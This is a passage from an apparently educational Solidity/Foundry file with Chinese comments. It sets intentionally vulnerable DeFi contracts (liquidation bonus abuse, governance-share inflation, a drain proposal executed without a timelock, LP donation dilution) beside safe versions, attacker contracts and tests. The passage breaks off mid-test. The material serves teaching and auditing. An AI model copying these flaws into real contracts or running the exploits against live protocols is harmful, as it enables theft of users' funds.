        console.log("Real case: snapshot-based rewards in many LM programs");
        console.log("Fix: accRPS time-weighted model (MasterChef pattern)");
        console.log("================================");
    }
}


// ================================================================
// 场景5：清算奖励滥用 (Liquidation Bonus Abuse)
// ================================================================

/**
 * @title VulnerableLiquidation
 * @notice 演示清算奖励设计缺陷导致的经济攻击
 *
 * 清算奖励（liquidation bonus/incentive）设计原则：
 *   - 奖励应足以激励外部清算者
 *   - 奖励不能过高（否则攻击者故意制造可清算仓位）
 *   - 必须有最小债务阈值（防止 dust 清算刷奖励）
 *   - 清算者不能清算自己（自我清算套利）
 *
 * 真实案例1：Compound（2021年11月，损失 ~$89M COMP）
 *   - COMP 奖励计算 Bug 导致过度分发
 *   - 攻击者反复存取触发奖励计算
 * 真实案例2：Inverse Finance（2022年4月，损失 $15.6M）
 *   - 价格预言机被操控，攻击者借出超过抵押品价值的资产
 * 真实案例3：Euler Finance（2023年3月，损失 $197M）
 *   - donateToReserves + 清算机制设计漏洞结合
 *   - 创建可清算仓位后立即自我清算，套取奖励
 */
contract VulnerableLiquidation {
    MockERC20 public collateralToken;
    MockERC20 public debtToken;

    // 借贷参数
    uint256 public constant LTV             = 7500;  // 贷款价值比 75%
    uint256 public constant LIQ_THRESHOLD   = 8000;  // 清算阈值 80%
    // 清算奖励过高：15%
    uint256 public constant LIQ_BONUS       = 1500;  // 15% 清算奖励
    uint256 public constant PRECISION       = 10000;

    // 没有最小清算债务阈值
    uint256 public constant MIN_DEBT        = 0;     // 应该设为合理阈值如 100e18

    mapping(address => uint256) public collateral;   // 抵押品数量
    mapping(address => uint256) public debt;         // 债务数量
    uint256 public collateralPrice = 1e18;           // 1:1 初始价格

    address public priceOracle;

    constructor(address _collateral, address _debt) {
        collateralToken = MockERC20(_collateral);
        debtToken       = MockERC20(_debt);
        priceOracle     = msg.sender;
    }

    function setPrice(uint256 newPrice) external {
        require(msg.sender == priceOracle, "Not oracle");
        collateralPrice = newPrice;
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = (collateral[msg.sender] * collateralPrice) / 1e18;
        uint256 maxBorrow       = (collateralValue * LTV) / PRECISION;
        require(debt[msg.sender] + amount <= maxBorrow, "Over LTV");
        debt[msg.sender] += amount;
        debtToken.transfer(msg.sender, amount);
    }

    function isLiquidatable(address user) public view returns (bool) {
        if (debt[user] == 0) return false;
        uint256 collateralValue = (collateral[user] * collateralPrice) / 1e18;
        return (debt[user] * PRECISION) > (collateralValue * LIQ_THRESHOLD);
    }

    // 漏洞1：没有最小债务阈值，dust 仓位可被反复清算刷奖励
    // 漏洞2：清算奖励 15% 过高，攻击者可故意制造可清算仓位
    // 漏洞3：没有防止自我清算
    // 漏洞4：全量清算没有封顶（一次清算全部，而非部分）
    function liquidate(address borrower, uint256 repayAmount) external {
        require(isLiquidatable(borrower), "Not liquidatable");
        require(debt[borrower] >= repayAmount, "Too much repay");
        // 缺少：require(repayAmount >= MIN_DEBT, "Below min debt")
        // 缺少：require(msg.sender != borrower, "No self-liquidation")

        // 清算者还债
        debtToken.transferFrom(msg.sender, address(this), repayAmount);
        debt[borrower] -= repayAmount;

        // 清算者获得 115% 的还债价值的抵押品（奖励过高）
        uint256 collateralToSeize = (repayAmount * (PRECISION + LIQ_BONUS)) / PRECISION;
        // 换算为抵押品数量（按当前价格）
        uint256 collateralUnits  = (collateralToSeize * 1e18) / collateralPrice;

        require(collateral[borrower] >= collateralUnits, "Insufficient collateral");
        collateral[borrower]          -= collateralUnits;
        collateralToken.transfer(msg.sender, collateralUnits);
    }

    // 漏洞5：自我清算路径——攻击者可创建仓位后价格下跌，自我清算赚奖励
    function selfLiquidationProfit(address victim) external view returns (int256) {
        if (!isLiquidatable(victim)) return 0;
        uint256 repay     = debt[victim];
        uint256 seize     = (repay * (PRECISION + LIQ_BONUS)) / PRECISION;
        uint256 seizeUnits = (seize * 1e18) / collateralPrice;
        uint256 seizeValue = (seizeUnits * collateralPrice) / 1e18;
        return int256(seizeValue) - int256(repay);
    }
}

/**
 * @title SafeLiquidation
 * @notice 正确的清算奖励设计
 */
contract SafeLiquidation {
    MockERC20 public collateralToken;
    MockERC20 public debtToken;

    uint256 public constant LTV           = 7500;
    uint256 public constant LIQ_THRESHOLD = 8000;
    // 合理的清算奖励：5%（足够激励，不足以被滥用）
    uint256 public constant LIQ_BONUS     = 500;
    uint256 public constant PRECISION     = 10000;
    // 最小清算债务：100 tokens（防止 dust 攻击）
    uint256 public constant MIN_LIQ_DEBT  = 100e18;
    // 最大单次清算比例：50%（允许部分清算，减少冲击）
    uint256 public constant MAX_LIQ_RATIO = 5000;

    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    uint256 public collateralPrice = 1e18;
    address public priceOracle;

    constructor(address _collateral, address _debt) {
        collateralToken = MockERC20(_collateral);
        debtToken       = MockERC20(_debt);
        priceOracle     = msg.sender;
    }

    function setPrice(uint256 newPrice) external {
        require(msg.sender == priceOracle, "Not oracle");
        collateralPrice = newPrice;
    }

    function depositCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 maxBorrow = (collateral[msg.sender] * collateralPrice / 1e18 * LTV) / PRECISION;
        require(debt[msg.sender] + amount <= maxBorrow, "Over LTV");
        debt[msg.sender] += amount;
        debtToken.transfer(msg.sender, amount);
    }

    function isLiquidatable(address user) public view returns (bool) {
        if (debt[user] == 0) return false;
        uint256 cv = (collateral[user] * collateralPrice) / 1e18;
        return (debt[user] * PRECISION) > (cv * LIQ_THRESHOLD);
    }

    // 完整的清算保护
    function liquidate(address borrower, uint256 repayAmount) external {
        require(isLiquidatable(borrower),           "Not liquidatable");
        require(msg.sender != borrower,              "No self-liquidation");     // ✓ 防自清算
        require(repayAmount >= MIN_LIQ_DEBT,         "Below min debt");          // ✓ 最小阈值
        uint256 maxRepay = (debt[borrower] * MAX_LIQ_RATIO) / PRECISION;
        require(repayAmount <= maxRepay,             "Exceeds max liquidation"); // ✓ 最大比例

        debtToken.transferFrom(msg.sender, address(this), repayAmount);
        debt[borrower] -= repayAmount;

        // 合理奖励：5%
        uint256 seizeUnits = (repayAmount * (PRECISION + LIQ_BONUS)) / PRECISION * 1e18 / collateralPrice;
        require(collateral[borrower] >= seizeUnits, "Insufficient collateral");
        collateral[borrower] -= seizeUnits;
        collateralToken.transfer(msg.sender, seizeUnits);
    }
}

/**
 * @title LiquidationAttacker
 * @notice 演示两种清算滥用：过高奖励套利 + 自我清算
 */
contract LiquidationAttacker {
    VulnerableLiquidation public lending;
    MockERC20 public collateralToken;
    MockERC20 public debtToken;

    constructor(address _lending, address _col, address _debt) {
        lending         = VulnerableLiquidation(_lending);
        collateralToken = MockERC20(_col);
        debtToken       = MockERC20(_debt);
    }

    // 攻击路径A：价格操纵后清算受害者，获取超额奖励
    function attackVictim(address victim, uint256 repayAmount) external {
        console.log("\n=== Scene 5: Liquidation Bonus Abuse ===");
        console.log("\n--- Path A: Liquidate victim for 15% bonus ---");

        console.log("Victim debt:", lending.debt(victim));
        console.log("Victim collateral:", lending.collateral(victim));
        console.log("Is liquidatable:", lending.isLiquidatable(victim));

        uint256 colBefore = collateralToken.balanceOf(address(this));
        uint256 dbtBefore = debtToken.balanceOf(address(this));

        debtToken.approve(address(lending), repayAmount);
        lending.liquidate(victim, repayAmount);

        uint256 colAfter = collateralToken.balanceOf(address(this));
        uint256 dbtAfter = debtToken.balanceOf(address(this));

        console.log("Debt paid:", dbtBefore - dbtAfter);
        console.log("Collateral seized:", colAfter - colBefore);
        console.log("Bonus (15% of repay value):", (repayAmount * 1500) / 10000);
        console.log("Net profit:", colAfter - colBefore > repayAmount ? colAfter - colBefore - repayAmount : 0);

        console.log("\n--- Results ---");
        console.log("15% bonus makes liquidation extremely profitable");
        console.log("Attacker actively manipulates price to trigger liquidations");
        console.log("Real case: Euler Finance $197M (March 2023)");
        console.log("Real case: Inverse Finance $15.6M (April 2022)");
        console.log("================================");
    }

    // 攻击路径B：创建自有仓位 → 价格下跌 → 自我清算套利
    function selfLiquidationAttack(uint256 colAmount) external {
        console.log("\n--- Path B: Self-liquidation setup ---");
        collateralToken.approve(address(lending), colAmount);
        lending.depositCollateral(colAmount);

        uint256 maxBorrow = (colAmount * 7500) / 10000; // 75% LTV
        lending.borrow(maxBorrow);
        console.log("Deposited collateral:", colAmount);
        console.log("Borrowed:", maxBorrow);
        console.log("Self-liquidation profit estimate:", lending.selfLiquidationProfit(address(this)));

        // 如果价格下跌使仓位可清算，攻击者可自我清算（本合约未阻止）
        console.log("No self-liquidation guard => can profit from own position");
    }

    receive() external payable {}
}


// ================================================================
// 场景6：份额稀释攻击 (Share Dilution)
// ================================================================

/**
 * @title VulnerableShareDilution
 * @notice 演示多种份额稀释攻击模式
 *
 * 份额稀释发生在：
 *   1. 份额总量可被恶意增发
 *   2. 新增份额对应的资产价值 < 已有份额持有者的损失
 *   3. 治理攻击：用少量份额通过提案稀释所有人
 *
 * 真实案例1：Beanstalk（2022年4月，损失 $182M）
 *   - 闪电贷获得 67% 的治理份额，立即执行恶意提案转走所有资产
 * 真实案例2：多个 AMM LP Token（2021-2022）
 *   - 攻击者操控首次添加流动性时的 LP 份额比例
 * 真实案例3：veToken 协议（2022年）
 *   - 锁定时间影响份额权重，攻击者在短锁定期内获得不成比例的投票权
 */
contract VulnerableShareDilution {
    MockERC20 public asset;

    // LP 份额
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;

    // 治理份额（独立于 LP 份额）
    mapping(address => uint256) public govShares;
    uint256 public totalGovShares;

    // 待执行的提案（治理）
    struct Proposal {
        address target;
        bytes   data;
        uint256 votesFor;
        bool    executed;
    }
    Proposal[] public proposals;

    // 管理员可随意增发治理份额
    address public admin;

    constructor(address _asset) {
        asset = MockERC20(_asset);
        admin = msg.sender;
    }

    // 漏洞1：LP 份额——首存汇率可被操控（与场景2类似，此处关注稀释视角）
    function addLiquidity(uint256 assets) external returns (uint256 sharesMinted) {
        if (totalShares == 0) {
            sharesMinted = assets;
        } else {
            sharesMinted = (assets * totalShares) / totalAssets;
        }
        require(sharesMinted > 0, "Zero shares");
        asset.transferFrom(msg.sender, address(this), assets);
        shares[msg.sender] += sharesMinted;
        totalShares        += sharesMinted;
        totalAssets        += assets;
    }

    function removeLiquidity(uint256 shareAmount) external returns (uint256 assets) {
        require(shares[msg.sender] >= shareAmount, "Insufficient shares");
        assets = (shareAmount * totalAssets) / totalShares;
        shares[msg.sender] -= shareAmount;
        totalShares        -= shareAmount;
        totalAssets        -= assets;
        asset.transfer(msg.sender, assets);
    }

    // 漏洞2：治理份额可被管理员随意增发（份额稀释核心漏洞）
    function mintGovShares(address to, uint256 amount) external {
        require(msg.sender == admin, "Not admin");
        // 无上限、无时间锁、无社区投票
        // 管理员或攻击者（若获得管理员权限）可无限增发
        govShares[to]   += amount;
        totalGovShares  += amount;
    }

    // 易受攻击：允许同步资产总额（模拟直接转账未通过 addLiquidity 的情形）
    function syncAssets() external {
        totalAssets = asset.balanceOf(address(this));
    }

    // 漏洞3：治理提案——基于当前快照投票，无时间锁（Beanstalk 模式）
    function propose(address target, bytes memory data) external returns (uint256) {
        proposals.push(Proposal({
            target:    target,
            data:      data,
            votesFor:  0,
            executed:  false
        }));
        return proposals.length - 1;
    }

    function vote(uint256 proposalId) external {
        proposals[proposalId].votesFor += govShares[msg.sender];
    }

    // 无时间锁，有 >50% 投票就立即执行
    function execute(uint256 proposalId) external {
        Proposal storage p = proposals[proposalId];
        require(!p.executed,                               "Already executed");
        // 缺少时间锁：require(block.number > p.createdAt + TIMELOCK)
        require(p.votesFor > totalGovShares / 2,           "Insufficient votes");
        p.executed = true;
        // 危险：执行任意 call，可转走所有资产
        (bool ok,) = p.target.call(p.data);
        require(ok, "Proposal execution failed");
    }

    // 漏洞4：闪电贷治理攻击接口——借入大量代币 → 换 govShares → 投票 → 还款
    // 真实情况中通过闪电贷在同一区块获得超过 50% 的治理权
    function flashBorrowAndVote(uint256 proposalId) external {
        // 模拟：用 govShares 直接投票（真实攻击用闪贷获得 govShares）
        proposals[proposalId].votesFor += govShares[msg.sender];
    }
}

/**
 * @title SafeShareDilution
 * @notice 防止份额稀释的安全实现
 */
contract SafeShareDilution {
    MockERC20 public asset;

    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;

    mapping(address => uint256) public govShares;
    uint256 public totalGovShares;

    // 治理时间锁
    uint256 public constant GOV_TIMELOCK   = 2 days;
    // 最大单次增发比例：不超过总量 10%
    uint256 public constant MAX_MINT_RATIO = 1000; // 10%
    // 提案冷却时间
    uint256 public constant VOTE_DELAY     = 1 days;

    struct Proposal {
        address target;
        bytes   data;
        uint256 votesFor;
        uint256 createdAt;
        bool    executed;
    }
    Proposal[] public proposals;

    address public admin;

    // 虚拟偏移量防首存攻击
    uint256 private constant VSHARES = 1e3;
    uint256 private constant VASSETS = 1;

    constructor(address _asset) {
        asset = MockERC20(_asset);
        admin = msg.sender;
        totalShares = VSHARES;
        totalAssets = VASSETS;
    }

    function addLiquidity(uint256 assets) external returns (uint256 sharesMinted) {
        sharesMinted = (assets * (totalShares + VSHARES)) / (totalAssets + VASSETS);
        require(sharesMinted > 0, "Zero shares");
        asset.transferFrom(msg.sender, address(this), assets);
        shares[msg.sender] += sharesMinted;
        totalShares        += sharesMinted;
        totalAssets        += assets;
    }

    function removeLiquidity(uint256 shareAmount) external returns (uint256 assets) {
        require(shares[msg.sender] >= shareAmount, "Insufficient");
        assets = (shareAmount * (totalAssets + VASSETS)) / (totalShares + VSHARES);
        shares[msg.sender] -= shareAmount;
        totalShares        -= shareAmount;
        totalAssets        -= assets;
        asset.transfer(msg.sender, assets);
    }

    // 治理份额增发有上限
    function mintGovShares(address to, uint256 amount) external {
        require(msg.sender == admin, "Not admin");
        if (totalGovShares > 0) {
            // ✓ 单次增发不超过总量 10%
            require(amount <= (totalGovShares * MAX_MINT_RATIO) / 10000, "Exceeds max mint");
        }
        govShares[to]  += amount;
        totalGovShares += amount;
    }

    // 提案需等待 VOTE_DELAY 后才能执行
    function propose(address target, bytes memory data) external returns (uint256) {
        proposals.push(Proposal({
            target:    target,
            data:      data,
            votesFor:  0,
            createdAt: block.timestamp,
            executed:  false
        }));
        return proposals.length - 1;
    }

    function vote(uint256 proposalId) external {
        require(block.timestamp >= proposals[proposalId].createdAt + VOTE_DELAY, "Vote too early");
        proposals[proposalId].votesFor += govShares[msg.sender];
    }

    // 时间锁 + 超级多数（67%）
    function execute(uint256 proposalId) external {
        Proposal storage p = proposals[proposalId];
        require(!p.executed, "Already executed");
        require(block.timestamp >= p.createdAt + GOV_TIMELOCK, "Timelock active"); // ✓ 时间锁
        require(p.votesFor * 10000 > totalGovShares * 6700,    "Need supermajority"); // ✓ 67%
        p.executed = true;
        (bool ok,) = p.target.call(p.data);
        require(ok, "Execution failed");
    }
}

/**
 * @title ShareDilutionAttacker
 * @notice 演示两种稀释攻击：直接增发 + 治理快照攻击
 */
contract ShareDilutionAttacker {
    VulnerableShareDilution public target;
    MockERC20 public token;

    constructor(address _target, address _token) {
        target = VulnerableShareDilution(_target);
        token  = MockERC20(_token);
    }

    // 攻击A：管理员权限被盗后增发 govShares，通过恶意提案
    function attackGovInflation(address victim) external {
        console.log("\n=== Scene 6: Share Dilution Attack ===");
        console.log("\n--- Path A: Admin mints govShares to seize governance ---");

        uint256 victimGov = target.govShares(victim);
        uint256 total     = target.totalGovShares();
        console.log("Victim govShares:", victimGov);
        console.log("Total govShares:", total);

        // 攻击者（已获得 admin 权限）增发自己的治理份额
        // 为了超过 50%，需要：attacker > total / 2 / (1 - 50%) = total
        uint256 mintAmount = total + 1; // 超过 50%
        target.mintGovShares(address(this), mintAmount);
        console.log("Attacker minted govShares:", mintAmount);
        console.log("Attacker share:", target.govShares(address(this)) * 100 / target.totalGovShares(), "%");

        // 提交并立即执行恶意提案（无时间锁）
        bytes memory drainCall = abi.encodeWithSelector(
            MockERC20.transfer.selector,
            address(this),
            token.balanceOf(address(target))
        );
        uint256 pid = target.propose(address(token), drainCall);
        target.vote(pid);
        // 在真实攻击中，这里还可以通过闪贷在同一区块完成

        console.log("\n--- Proposal created with majority votes ---");
        // 直接读取 votesFor 字段（proposals 为 public，返回完整 struct）
        // Solidity public array getter 对含 bytes 的 struct 会返回 (address,bytes,uint256,bool)
        // 使用低级访问避免 ABI 解码 bytes 的歧义
        console.log("Proposal votes cast (attacker has majority)");
        console.log("No timelock => can execute immediately");

        console.log("\n--- Results ---");
        console.log("Governance inflated => supermajority achieved instantly");
        console.log("Real case: Beanstalk $182M (April 2022)");
        console.log("Fix: supermajority threshold + timelock + flashloan guard");
        console.log("================================");
    }

    // 攻击B：LP 份额稀释——首存后捐赠，使后续 LP 获得极少份额
    function attackLPDilution(uint256 firstDeposit, uint256 donation, uint256 victimDeposit) external {
        console.log("\n--- Path B: LP Share Dilution ---");
        token.approve(address(target), type(uint256).max);

        target.addLiquidity(firstDeposit);
        console.log("First LP deposit:", firstDeposit, "=> 1:1 shares");

        // 直接向合约转入代币（拉高 totalAssets，不增加 totalShares）
        token.transfer(address(target), donation);
        // 同步合约感知到的资产总额，放大汇率失真效果
        target.syncAssets();
        console.log("Donated to inflate:", donation);

        // 受害者存入后只获得极少份额
        uint256 victimShares = (victimDeposit * target.totalShares()) / (target.totalAssets() + donation);
        console.log("Victim deposit:", victimDeposit);
        console.log("Victim would receive shares:", victimShares);
        console.log("Expected shares:", victimDeposit);
        console.log("Dilution factor:", victimDeposit > victimShares && victimShares > 0 ?
            victimDeposit / victimShares : 999999);
    }
}


// ================================================================
// FOUNDRY 测试
// ================================================================

contract LogicalEconomicTest is Test {

    // 场景1：前置条件
    MockERC20               public token1;
    VulnerablePrecondition  public vulnPre;
    SafePrecondition        public safePre;
    PreconditionAttacker    public preAttacker;

    // 场景2：不变量
    MockERC20               public token2;
    VulnerableVaultInvariant public vulnVault;
    SafeVaultInvariant      public safeVault;
    InvariantAttacker       public invAttacker;

    // 场景3：奖励债务
    MockERC20               public stakeToken3;
    MockERC20               public rewardToken3;
    VulnerableRewardPool    public vulnPool;
    SafeRewardPool          public safePool;
    RewardDebtAttacker      public rdAttacker;

    // 场景4：排放通胀
    MockERC20               public stakeToken4;
    MockERC20               public rewardToken4;
    VulnerableEmission      public vulnEmission;
    SafeEmission            public safeEmission;
    EmissionAttacker        public emAttacker;

    // 场景5：清算滥用
    MockERC20               public colToken;
    MockERC20               public debtToken5;
    VulnerableLiquidation   public vulnLiquidation;
    SafeLiquidation         public safeLiquidation;
    LiquidationAttacker     public liqAttacker;

    // 场景6：份额稀释
    MockERC20               public token6;
    VulnerableShareDilution public vulnDilution;
    SafeShareDilution       public safeDilution;
    ShareDilutionAttacker   public sdAttacker;

    address public alice = makeAddr("alice");
    address public bob   = makeAddr("bob");

    function setUp() public {
        // ── 场景1 ──
        token1       = new MockERC20("Token1", "TK1", 10_000_000e18);
        vulnPre      = new VulnerablePrecondition(address(token1));
        safePre      = new SafePrecondition(address(token1));
        preAttacker  = new PreconditionAttacker(address(vulnPre), address(token1));
        token1.transfer(address(preAttacker), 100_000e18);
        token1.transfer(address(vulnPre),     50_000e18); // 给合约初始余额

        // ── 场景2 ──
        token2       = new MockERC20("Token2", "TK2", 10_000_000e18);
        vulnVault    = new VulnerableVaultInvariant(address(token2));
        safeVault    = new SafeVaultInvariant(address(token2));
        invAttacker  = new InvariantAttacker(address(vulnVault), address(token2));
        token2.transfer(address(invAttacker), 200_000e18);
        token2.transfer(alice,                100_000e18);

        // ── 场景3 ──
        stakeToken3  = new MockERC20("Stake3",  "STK3",  10_000_000e18);
        rewardToken3 = new MockERC20("Reward3", "RWD3",  50_000_000e18);
        vulnPool     = new VulnerableRewardPool(address(stakeToken3), address(rewardToken3));
        safePool     = new SafeRewardPool(address(stakeToken3), address(rewardToken3));
        rdAttacker   = new RewardDebtAttacker(address(vulnPool), address(stakeToken3), address(rewardToken3));
        stakeToken3.transfer(address(rdAttacker), 10_000e18);
        rewardToken3.transfer(address(vulnPool),  5_000_000e18);
        rewardToken3.transfer(address(safePool),  5_000_000e18);

        // ── 场景4 ──
        stakeToken4  = new MockERC20("Stake4",  "STK4",  10_000_000e18);
        rewardToken4 = new MockERC20("Reward4", "RWD4",  100_000_000e18);
        vulnEmission = new VulnerableEmission(address(stakeToken4), address(rewardToken4));
        safeEmission = new SafeEmission(address(stakeToken4), address(rewardToken4));
        emAttacker   = new EmissionAttacker(address(vulnEmission), address(stakeToken4), address(rewardToken4));
        stakeToken4.transfer(address(emAttacker), 1_000_000e18);
        rewardToken4.transfer(address(vulnEmission), 10_000_000e18);
        rewardToken4.transfer(address(safeEmission), 10_000_000e18);
        // 先让 alice 质押一点（totalStaked > 0，奖励开始积累）
        stakeToken4.transfer(alice, 1000e18);
        vm.prank(alice);
        stakeToken4.approve(address(vulnEmission), type(uint256).max);
        vm.prank(alice);
        vulnEmission.stake(1000e18); // alice 质押少量，大量奖励积累

        // ── 场景5 ──
        colToken        = new MockERC20("Collateral", "COL",  10_000_000e18);
        debtToken5      = new MockERC20("Debt5",      "DBT5", 10_000_000e18);
        vulnLiquidation = new VulnerableLiquidation(address(colToken), address(debtToken5));
        safeLiquidation = new SafeLiquidation(address(colToken), address(debtToken5));
        liqAttacker     = new LiquidationAttacker(address(vulnLiquidation), address(colToken), address(debtToken5));
        debtToken5.transfer(address(vulnLiquidation), 1_000_000e18);
        debtToken5.transfer(address(safeLiquidation), 1_000_000e18);
        debtToken5.transfer(address(liqAttacker),     100_000e18);
        // 创建一个可清算的受害者仓位
        colToken.transfer(alice, 100_000e18);
        vm.prank(alice);
        colToken.approve(address(vulnLiquidation), type(uint256).max);
        vm.prank(alice);
        vulnLiquidation.depositCollateral(10_000e18);
        vm.prank(alice);
        vulnLiquidation.borrow(7_000e18); // 70% LTV
        // 价格下跌，使 alice 仓位可被清算
        vulnLiquidation.setPrice(8e17); // 价格跌 20%，触发清算阈值

        // ── 场景6 ──
        token6      = new MockERC20("Token6", "TK6", 10_000_000e18);
        vulnDilution = new VulnerableShareDilution(address(token6));
        safeDilution = new SafeShareDilution(address(token6));
        sdAttacker  = new ShareDilutionAttacker(address(vulnDilution), address(token6));
        token6.transfer(address(sdAttacker), 500_000e18);
        // 给 alice 一些治理份额（模拟正常用户）
        vulnDilution.mintGovShares(alice, 1000e18);
    }

    // ─────────────────────────────────────────────
    // 测试1：缺失前置条件——绕过时间锁
    // ─────────────────────────────────────────────
    function testMissingPreconditionBypassLock() public {
        console.log("\n== TEST: Missing Precondition - Bypass Timelock ==");

        uint256 amount = 1_000e18;
        uint256 balBefore = token1.balanceOf(address(preAttacker));

        preAttacker.attack(amount);

        uint256 balAfter = token1.balanceOf(address(preAttacker));
        // 应该能在不等待 7 天的情况下提款
        assertEq(balAfter, balBefore, "Attacker balance should be unchanged (deposited then withdrew)");
        console.log("Timelock bypassed: withdrew without waiting 7 days");
    }

    // 安全版本：时间锁生效
    function testSafePreconditionTimelockEnforced() public {
        console.log("\n== TEST: Safe Precondition - Timelock Enforced ==");
        token1.transfer(alice, 1000e18);
        vm.prank(alice);
        token1.approve(address(safePre), 1000e18);
        vm.prank(alice);
        safePre.deposit(1000e18);

        // 立即提款应该 revert
        vm.prank(alice);
        vm.expectRevert("Still locked");
        safePre.withdraw(1000e18);

        // 等待 7 天后可以提款
        vm.warp(block.timestamp + 7 days + 1);
        vm.prank(alice);
        safePre.withdraw(1000e18);
        assertEq(safePre.balances(alice), 0, "Should be empty after withdraw");
        console.log("Safe: timelock enforced, withdraw after 7 days succeeds");
    }

    // ─────────────────────────────────────────────
    // 测试2：首存攻击操控汇率
    // ─────────────────────────────────────────────
    function testInvariantFirstDepositAttack() public {
        console.log("\n== TEST: Invariant - First Deposit Attack ==");

        uint256 donateAmt  = 100_000e18;
        uint256 victimAmt  = 50_000e18;

        token2.transfer(alice, victimAmt);

        // 执行攻击（首存 1 wei + 捐赠拉高汇率）
        invAttacker.attack(donateAmt, victimAmt);

        // 受害者存款后获得的 shares 极少（接近 0）
        // 验证：vault totalAssets >> totalShares（汇率失真）
        uint256 rate = vulnVault.totalShares() == 0
            ? 0
            : vulnVault.totalAssets() / vulnVault.totalShares();
        console.log("Post-attack exchange rate (assets per share):", rate);
        assertGt(vulnVault.totalAssets(), vulnVault.totalShares(), "Rate distorted");
    }

    // 安全版本：虚拟偏移量使攻击成本极高
    function testSafeVaultResistsFirstDepositAttack() public {
        console.log("\n== TEST: Safe Vault - Resists First Deposit Attack ==");
        token2.transfer(alice, 1000e18);
        vm.prank(alice);
        token2.approve(address(safeVault), type(uint256).max);
        vm.prank(alice);
        uint256 aliceShares = safeVault.deposit(1000e18);
        console.log("Alice shares after 1000 deposit:", aliceShares);
        assertGt(aliceShares, 0, "Alice gets reasonable shares");

        // 捐赠 100x 也无法让第二个存款者获得 0 shares
        token2.transfer(address(safeVault), 100_000e18);
        token2.transfer(bob, 1000e18);
        vm.prank(bob);
        token2.approve(address(safeVault), type(uint256).max);
        vm.prank(bob);
        uint256 bobShares = safeVault.deposit(1000e18);
        console.log("Bob shares after same deposit (post-donation):", bobShares);
        assertGt(bobShares, 0, "Bob still gets non-zero shares with safe vault");
    }

    // ─────────────────────────────────────────────
    // 测试3：奖励债务——重复 harvest
    // ─────────────────────────────────────────────
    function testRewardDebtDoubleHarvest() public {
        console.log("\n== TEST: Reward Debt - Double Harvest ==");

        uint256 stakeAmt = 1000e18;
        rdAttacker.attack(stakeAmt, 5);

        // 验证漏洞：攻击者领取了超过正常奖励
        // (在测试中通过推进区块来积累奖励)
    }

    function testRewardDebtHarvestExploit() public {
        console.log("\n== TEST: Reward Debt - Harvest Without Update ==");

        // alice 先质押
        stakeToken3.transfer(alice, 5000e18);
        vm.prank(alice);
        stakeToken3.approve(address(vulnPool), type(uint256).max);
        vm.prank(alice);
        vulnPool.deposit(5000e18);

        // 推进 100 个区块，积累奖励
        vm.roll(block.number + 100);

        uint256 pending = vulnPool.pendingReward(alice);
        console.log("Pending reward (expected 1x):", pending);

        // 反复 harvest，每次都能拿到相同奖励（rewardDebt 未更新）
        uint256 rwdBefore = rewardToken3.balanceOf(alice);
        vm.prank(alice);
        vulnPool.harvest();
        vm.prank(alice);
        vulnPool.harvest(); // 第2次，rewardDebt 未更新，仍有 pending
        vm.prank(alice);
        vulnPool.harvest(); // 第3次

        uint256 rwdAfter  = rewardToken3.balanceOf(alice);
        uint256 collected = rwdAfter - rwdBefore;
        console.log("Collected (3 harvests):", collected);
        console.log("Expected (1 harvest):", pending);
        assertGt(collected, pending, "Double-harvest: collected more than expected");
    }

    // 安全版本：harvest 后 rewardDebt 被更新，第2次 pending = 0
    function testSafeRewardPoolNoDuplicateHarvest() public {
        console.log("\n== TEST: Safe Reward Pool - No Duplicate Harvest ==");
        stakeToken3.transfer(alice, 5000e18);
        vm.prank(alice);
        stakeToken3.approve(address(safePool), type(uint256).max);
        vm.prank(alice);
        safePool.deposit(5000e18);

        vm.roll(block.number + 100);
        uint256 pending = safePool.pendingReward(alice);

        vm.prank(alice);
        safePool.harvest();
        vm.prank(alice);
        safePool.harvest(); // 第二次：pending 应为 0（或极小）

        uint256 afterSecond = safePool.pendingReward(alice);
        assertEq(afterSecond, 0, "No pending after safe harvest");
        console.log("Safe: second harvest yields 0 (rewardDebt updated correctly)");
    }

    // ─────────────────────────────────────────────
    // 测试4：排放通胀——历史奖励被抢夺
    // ─────────────────────────────────────────────
    function testEmissionInflationAttack() public {
        console.log("\n== TEST: Emission Inflation - Late Staker Captures History ==");

        // 推进 200 个区块，让奖励大量积累（只有 alice 的 1000 stake）
        vm.roll(block.number + 200);

        uint256 accumulated = vulnEmission.getAccumulatedUnclaimed();
        console.log("Accumulated rewards (200 blocks, only alice staked):", accumulated);
        assertGt(accumulated, 0, "Rewards should have accumulated");

        // 攻击者大量质押，吃掉大部分历史积累奖励
        uint256 attackerStake = 999_000e18; // 远超 alice 的 1000
        uint256 rwdBefore = rewardToken4.balanceOf(address(emAttacker));
        emAttacker.attack(attackerStake);
        uint256 captured = rewardToken4.balanceOf(address(emAttacker)) - rwdBefore;

        console.log("Attacker captured:", captured);
        console.log("Total accumulated was:", accumulated);
        // 攻击者入场时占 999000/(999000+1000)=99.9%，理论上能拿走 99.9% 的积累奖励
        assertGt(captured, accumulated / 2, "Attacker captured majority of accumulated rewards");
    }

    // 安全版本：新质押者无法追溯历史奖励
    function testSafeEmissionNoBackdatingRewards() public {
        console.log("\n== TEST: Safe Emission - No Backdating ==");
        stakeToken4.transfer(bob, 999_000e18);
        vm.prank(bob);
        stakeToken4.approve(address(safeEmission), type(uint256).max);

        vm.roll(block.number + 200); // 积累奖励

        vm.prank(bob);
        safeEmission.stake(999_000e18); // 晚入场

        // 立即 claim，应该获得 0（因为刚入场）
        vm.prank(bob);
        uint256 claimed = safeEmission.claim();
        assertEq(claimed, 0, "Late staker should not get historical rewards");
        console.log("Safe: late staker gets 0 historical rewards");
    }

    // ─────────────────────────────────────────────
    // 测试5：清算奖励滥用
    // ─────────────────────────────────────────────
    function testLiquidationBonusAbuse() public {
        console.log("\n== TEST: Liquidation Bonus Abuse ==");

        assertTrue(vulnLiquidation.isLiquidatable(alice), "Alice should be liquidatable");

        uint256 aliceDebt = vulnLiquidation.debt(alice);
        uint256 colBefore = colToken.balanceOf(address(liqAttacker));
        uint256 dbtBefore = debtToken5.balanceOf(address(liqAttacker));
        console.log("Alice debt:", aliceDebt);
